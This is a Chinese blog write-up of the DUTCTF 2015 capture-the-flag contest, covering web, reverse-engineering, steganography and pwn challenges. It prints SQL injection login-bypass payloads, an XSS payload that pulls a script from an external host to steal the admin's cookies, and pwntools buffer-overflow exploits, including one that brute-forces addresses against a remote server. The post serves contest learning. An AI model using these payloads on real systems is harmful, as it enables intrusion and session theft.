<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="A blog containing some interesting things."><title>DUTCTF-2015 正式比赛Writeup | Beeeの零碎事</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">DUTCTF-2015 正式比赛Writeup</h1><a id="logo" href="/.">Beeeの零碎事</a><p class="description">Just so so~</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">DUTCTF-2015 正式比赛Writeup</h1><div class="post-meta">Apr 26, 2015</div><div class="post-content"><p>题目不算难，web题基本上都是秒了的，misc题目涉及了一点硬件知识，挺新颖的。pwn题处理得不好，老出问题，后来了解到是他们那边管理人员沟通得不够，加上第一次举办CTF，没有经验，导致一些细节处理得不是很好。</p>
<p>另：本文已发表到360播报。</p>
<h3 id="web-10Pts"><a href="#web-10Pts" class="headerlink" title="web 10Pts"></a>web 10Pts</h3><p>DJ昨天才搭的网站，今天就被撸了，发现了一个一句话木马，密码是cmd，你能发现什么有用信息吗？ <a href="http://dl.dutsec.cn/web/web10/index.php" target="_blank" rel="noopener">http://dl.dutsec.cn/web/web10/index.php</a></p>
<p>分别GET和POST提交<code>cmd=phpinfo();</code>，POST方法服务器回应了flag：<br><code>DUTCTF{caidao_is_very_niubi}</code></p>
<h3 id="Reverse-10Pts"><a href="#Reverse-10Pts" class="headerlink" title="Reverse 10Pts"></a>Reverse 10Pts</h3><p>一个简单的逆向程序，秒秒钟搞定<br>dl.dutsec.cn/reverse/reverse10/reverse10.exe</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw18g326qj30lf04smx3.jpg" alt="re10"></p>
<p>直接上IDA，在<code>sub_401000</code>函数里能找到十六进制的flag字符串，抠出来unhex即可。<br><code>DUTCTF{We1c0met0DUTCTF}</code></p>
<h3 id="Web-50Pts"><a href="#Web-50Pts" class="headerlink" title="Web 50Pts"></a>Web 50Pts</h3><p>kow才开始学php，写了个小网站，但是有点安全问题，你能利用漏洞获取flag吗？<br><a href="http://dl.dutsec.cn/web/05c035b1d7e82a97/index.php" target="_blank" rel="noopener">http://dl.dutsec.cn/web/05c035b1d7e82a97/index.php</a></p>
<p>简单注入，直接用户名处万能密码<code>&#39; or 1=1)#</code>得到flag<br><code>DUTCTF{Is_PHP_not_safe?}</code></p>
<h3 id="硬起来-50Pts"><a href="#硬起来-50Pts" class="headerlink" title="硬起来 50Pts"></a>硬起来 50Pts</h3><p>FLAG已经给出了（注：答案以十六进制表示）<br><a href="http://dl.dutsec.cn/misc/misc50/a6d7548b4f9c94f1.png" target="_blank" rel="noopener">http://dl.dutsec.cn/misc/misc50/a6d7548b4f9c94f1.png</a></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw18rbeu7j30ui07i74h.jpg" alt="硬起来0"><br>把提供的png检查了一遍，确定不是隐写题。根据提示，答案以十六进制表示，尝试把HELLO转为十六进制后提交，失败。后来想到数码管的十六进制表示方式，分别将每个数码管中的字形转化为相应的十六进制，这里还要分共阳极、共阴极。最后提交，得到flag</p>
<p>数码管布局<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw18wlm3zj307i0acdhk.jpg" alt="硬起来1"></p>
<p>常见字形与其十六进制编码<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw196rlg6j30bq05qt8v.jpg" alt="硬起来2"></p>
<p>题目中字形的编码<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw19c1h44j30gr04zwev.jpg" alt="硬起来3"></p>
<p>尝试后发现，题目中红色的为共阳极数码管，蓝色的为共阴极数码管，故最后flag为<br><code>DUTCTF{8979C738C0}</code></p>
<h3 id="屌丝逆袭-50Pts"><a href="#屌丝逆袭-50Pts" class="headerlink" title="屌丝逆袭 50Pts"></a>屌丝逆袭 50Pts</h3><p>一个普通的逆向程序，分分钟搞定<br>dl.dutsec.cn/reverse/reverse50/reverse50.exe</p>
<p>IDA动态跟了一下，即可分析出算法</p>
<p>scanf断下来后，输入11111111111111111111后F8单步<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw19nznyij30kr06rjrc.jpg" alt="re50-1"></p>
<p>跟下去后发现我们输入的数据变成了12345123451234512345<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw19smhbjj30ae0a3aa1.jpg" alt="re50-2"></p>
<p>再跟下去发现是和一个字符串进行对比<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw19w3ifej30ls04zq2u.jpg" alt="re50-3"></p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1a739arj30ak0bqq2y.jpg" alt="此处输入图片的描述"></p>
<p>于是算法出来了，下面直接贴exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str=&apos;DVVFXK&#123;Ig45tI(oNs|Hbjdlf&#125;&apos;</span><br><span class="line">key=&apos;&apos;</span><br><span class="line">i=0</span><br><span class="line">for x in str:</span><br><span class="line">    key = key + chr(ord(x)-i)</span><br><span class="line">    if(i==5):</span><br><span class="line">        i=0</span><br><span class="line">    else:</span><br><span class="line">        i=i+1</span><br><span class="line">print key</span><br></pre></td></tr></table></figure></p>
<p><code>DUTCTF{He11oI&#39;mKowHahaha}</code></p>
<h3 id="PHP大法-100Pts"><a href="#PHP大法-100Pts" class="headerlink" title="PHP大法 100Pts"></a>PHP大法 100Pts</h3><p>DJ觉得kow写的网站太渣，他也来写了一个，但是说好的源码呢？（注意备份文件哦）<br><a href="http://dl.dutsec.cn/web/c66ba13ab15ac925/index.php" target="_blank" rel="noopener">http://dl.dutsec.cn/web/c66ba13ab15ac925/index.php</a></p>
<p>提示备份文件，尝试<a href="http://dl.dutsec.cn/web/c66ba13ab15ac925/index.php.bak，得到页面源码：" target="_blank" rel="noopener">http://dl.dutsec.cn/web/c66ba13ab15ac925/index.php.bak，得到页面源码：</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
<p>很简单，二次编码，提交 <code>id=%2568ackerDJ</code> 即可<br><code>DUTCTF{PHP_is_the_best_program_language_in_the_world}</code></p>
<h3 id="长者-100Pts"><a href="#长者-100Pts" class="headerlink" title="长者 100Pts"></a>长者 100Pts</h3><p>长者和他谈笑风生<br><a href="http://dl.dutsec.cn/misc/misc100/misc100.jpg" target="_blank" rel="noopener">http://dl.dutsec.cn/misc/misc100/misc100.jpg</a></p>
<p>分析了一下，隐写题。jpg后面有个png，winhex抠出来，发现是个二维码。解析这个二维码，为一个twitter链接，访问得到一个字符串，rot13之后得到flag。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw1ae6ojdj30kg0dvgmp.jpg" alt="misc100-1"></p>
<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw1ae44ymj30m80m80s9.jpg" alt="misc100-2"></p>
<p><code>DUTCTF{Too_young_too_naive}</code></p>
<h3 id="Poi-100Pts"><a href="#Poi-100Pts" class="headerlink" title="Poi? 100Pts"></a>Poi? 100Pts</h3><p>kow一气之下又写了一个网站，但是他好像又疏忽了<br><a href="http://dl.dutsec.cn/web/f73b6ed70786ef40/index.php" target="_blank" rel="noopener">http://dl.dutsec.cn/web/f73b6ed70786ef40/index.php</a></p>
<p>有注入，但是简单的万能密码绕不过。仔细看html页面源码，有提示<code>&lt;a href=&quot;index.php.bak&quot;&gt;</code>，访问，得到页面源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">kow&apos;s secure site</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;php&quot;;</span><br><span class="line">$password = &quot;##############&quot;;</span><br><span class="line">$database = &quot;php&quot;;</span><br><span class="line"></span><br><span class="line">// ´´½¨l½Ó</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysqli_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysqli_query($conn,$sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysqli_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysqli_fetch_array($query);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: ################################ &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type=password name=pass value=&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=&quot;index.php.bak&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>知道验证逻辑就好办了，用union select来返回一个已知明文的md5，payload：<br><code>user=&#39; union select &#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pass=123</code></p>
<p><code>DUTCTF{SQL_injection_is_fun_right?}</code></p>
<h3 id="你懂的-300Pts"><a href="#你懂的-300Pts" class="headerlink" title="你懂的 300Pts"></a>你懂的 300Pts</h3><p>DJ写了一个你懂的网址收集系统，每天24小时盯着，你能从中获取flag吗？(hint:DJ的qq26490441曾经被盗过)<br><a href="http://dl.dutsec.cn/web/xss/index.html" target="_blank" rel="noopener">http://dl.dutsec.cn/web/xss/index.html</a></p>
<p>由题目描述猜测是xss题，根据提示，用<a href="mailto:26490441@qq.com" target="_blank" rel="noopener">26490441@qq.com</a>和随意密码即可登陆，登陆后为xss payload提交页面。但是xss点在哪？看了一下登陆页面，有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function escape(input)</span><br><span class="line">&#123;</span><br><span class="line">    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</span><br><span class="line">    input = input.replace(stripTagsRE, &apos;&apos;);</span><br><span class="line">    return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">document.write(escape(unescape(location.hash.substr(1))))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>典型的js parser，通根据给出的信息，浏览器为Firefox，构造出payload：<br><code>http://dl.dutsec.cn/web/xss/index.html#aaaa&lt;script/src=&quot;http://t.cn/RAHPTaL&quot;//</code></p>
<p>等待管理员访问后记录到cookies，里面包含flag：<br><code>DUTCTF{easyxss}</code></p>
<p>PS：该题xss payload提交地址为windows+xampp环境。开始的时候没留意，没看到登陆页面那段js，另外又查到了xampp有xss，于是找了相同版本的xampp来本地测试，通过了，但是提交上去却打不到flag。通过这个xampp的xss应该是可以把xampp搞下来的，后来没测试，因为服务端那边的刷新脚本老是挂掉，提交过去的payload不能及时访问。</p>
<h3 id="Py大法-300Pts"><a href="#Py大法-300Pts" class="headerlink" title="Py大法 300Pts"></a>Py大法 300Pts</h3><p>一个传说的逆向程序，搞定 由这个程序加密得到0be6770IigHXZpz9hQYR1fpl15R0z9MUalmYEPhJeEN/sRklL6wQw5yQ7SAyT6tKGJNY0AxnyzS/L7zWQII= 明文即flag<br><a href="http://dl.dutsec.cn/reverse/reverse300/reverse300.pyc" target="_blank" rel="noopener">http://dl.dutsec.cn/reverse/reverse300/reverse300.pyc</a></p>
<p>根据提示需要逆向pyc，google上翻了一下，找到 <a href="https://github.com/wibiti/uncompyle2" target="_blank" rel="noopener">https://github.com/wibiti/uncompyle2</a></p>
<p>用这个工具反编译pyc，得到源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line">import base64</span><br><span class="line">from time import time</span><br><span class="line">from datetime import datetime</span><br><span class="line">UC_KEY = &apos;123456789&apos;</span><br><span class="line"></span><br><span class="line">def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0):</span><br><span class="line">    ckey_length = 4</span><br><span class="line">    if key == &apos;&apos;:</span><br><span class="line">        key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    else:</span><br><span class="line">        key = md5(key.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    if ckey_length == 0:</span><br><span class="line">        keyc = &apos;&apos;</span><br><span class="line">    elif operation == &apos;DECODE&apos;:</span><br><span class="line">        keyc = string[0:ckey_length]</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        keyc = md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:]</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    key_length = len(cryptkey)</span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        string = base64.b64decode(string[ckey_length:])</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        if expiry == 0:</span><br><span class="line">            string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">        else:</span><br><span class="line">            string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    string_length = len(string)</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    box = range(256)</span><br><span class="line">    rndkey = [0] * 256</span><br><span class="line">    for i in range(256):</span><br><span class="line">        rndkey[i] = ord(cryptkey[i % key_length])</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % 256</span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line"></span><br><span class="line">    a = j = 0</span><br><span class="line">    for i in range(string_length):</span><br><span class="line">        a = (a + 1) % 256</span><br><span class="line">        j = (j + box[a]) % 256</span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256])</span><br><span class="line"></span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0:</span><br><span class="line">            if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]:</span><br><span class="line">                return result[26:]</span><br><span class="line">            else:</span><br><span class="line">                return &apos;&apos;</span><br><span class="line">        else:</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">    else:</span><br><span class="line">        return keyc + base64.b64encode(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        exit(1)</span><br><span class="line">    ex = 20</span><br><span class="line">    for i in range(1, len(sys.argv), 2):</span><br><span class="line">        a = sys.argv[i]</span><br><span class="line">        b = sys.argv[i + 1]</span><br><span class="line">        if a == &apos;-t&apos;:</span><br><span class="line">            ex = int(b)</span><br><span class="line">        elif a == &apos;-e&apos;:</span><br><span class="line">            encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex)</span><br><span class="line">            print encoded</span><br><span class="line">        elif a == &apos;-d&apos;:</span><br><span class="line">            decoded = authcode(b, &apos;DECODE&apos;, expiry=ex)</span><br><span class="line">            print decoded</span><br></pre></td></tr></table></figure>
<p>UC_KEY加密算法，但是直接 <code>python reverse300.py -d 0be6770IigHXZpz9hQYR1fpl15R0z9MUalmYEPhJeEN/sRklL6wQw5yQ7SAyT6tKGJNY0AxnyzS/L7zWQII=</code> 无回显，猜测加密时加了时效。</p>
<p>修改脚本中62和64行的 <code>return &#39;&#39;</code> 为 <code>return result[26:]</code>即可<br><code>DUTCTF{2u0_chu_14i_d3_5hi_h3n74i}</code></p>
<h3 id="告白-10Pts"><a href="#告白-10Pts" class="headerlink" title="告白 10Pts"></a>告白 10Pts</h3><p>我是一个害羞的程序员⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄ 我把表白写在了这个程序里。<br><a href="http://dl.dutsec.cn/pwn/pwn10/pwn10.c" target="_blank" rel="noopener">http://dl.dutsec.cn/pwn/pwn10/pwn10.c</a><br>nc 210.30.100.91 3857</p>
<p>提供的程序为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char b;</span><br><span class="line">    int a = 1;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;b);</span><br><span class="line">    if (a == 4340 &amp;&amp; b==&apos;G&apos;)</span><br><span class="line">        printf(&quot;Go to seek the flag&quot;);</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;Try again&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的溢出，’G’的Ascii为47，4340的十六进制为10F4，拼接起来为10F447，即十进制1111111，nc连上去后发送1111111即可得到flag<br><code>Flag is : DUTCTF{I lov3 Dj}</code></p>
<h3 id="水题-50Pts"><a href="#水题-50Pts" class="headerlink" title="水题 50Pts"></a>水题 50Pts</h3><p>原来pwn这么简单，不过这次你还能搞定么？<br><a href="http://dl.dutsec.cn/pwn/pwn50/pwn50" target="_blank" rel="noopener">http://dl.dutsec.cn/pwn/pwn50/pwn50</a><br>nc 210.30.100.91 3858</p>
<p>提供的程序为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">void reada(char* s,int l)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    for (i=0;i&lt;l;i++)&#123;</span><br><span class="line">        s[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pwnme()&#123;</span><br><span class="line">    char a[3];</span><br><span class="line">    reada(a,19);</span><br><span class="line">    printf(&quot;%s\n&quot;,a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getflag()&#123;</span><br><span class="line">    printf(&quot;Go seek the flag!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    pwnme();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是简单的栈溢出，本地ubuntu 14.04.4 32bit编译出binary</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw1aswh4kj30nl0frgni.jpg" alt="pwn50-1"></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw1ayf72yj30cz0hi74f.jpg" alt="pwn50-2"></p>
<p>gdb看了一下栈结构，算了一下，刚好能覆盖到<code>pwnme()</code>的返回地址。IDA找出了<code>getflag()</code>的地址 <code>0x08048505</code>，用这个地址来覆盖<code>pwnme()</code>的返回地址，使其返回的时候跳去执行<code>getflag()</code>。本机测试成功，下面是本机测试的exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = process(&apos;./pwn50&apos;)</span><br><span class="line">r.send(&apos;aaaaaaaaaaaaaaa&apos;+p32(0x08048505))</span><br><span class="line">result = r.recvuntil(&apos;!&apos;)</span><br><span class="line">print result</span><br></pre></td></tr></table></figure>
<p>但是线上环境就不行了，因为没有提供线上的binary，没办法得到线上环境<code>getflag()</code>的函数地址，自己刚接触pwn不久也不知道有什么其他方法。于是尝试了爆破<code>getflag()</code>地址，下面是爆破用的exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">for laddr in xrange(173,256):</span><br><span class="line">        #r = process(&apos;./pwn50&apos;)</span><br><span class="line">        r = remote(&apos;210.30.100.91&apos;,&apos;3858&apos;)</span><br><span class="line">        r.send(&apos;aaaaaaaaaaaaaaa&apos;+p32(0x08048400+laddr)+&apos;\n&apos;)</span><br><span class="line">        try:</span><br><span class="line">                result = r.recv()</span><br><span class="line">                print result</span><br><span class="line">                if result.find(&apos;DUT&apos;) &gt; 0:</span><br><span class="line">                        r.close()</span><br><span class="line">                        break</span><br><span class="line">                else:</span><br><span class="line">                        r.close()</span><br><span class="line">                        print laddr</span><br><span class="line">        except:</span><br><span class="line">                r.close()</span><br><span class="line">                print laddr</span><br><span class="line">                time.sleep(2)</span><br></pre></td></tr></table></figure>
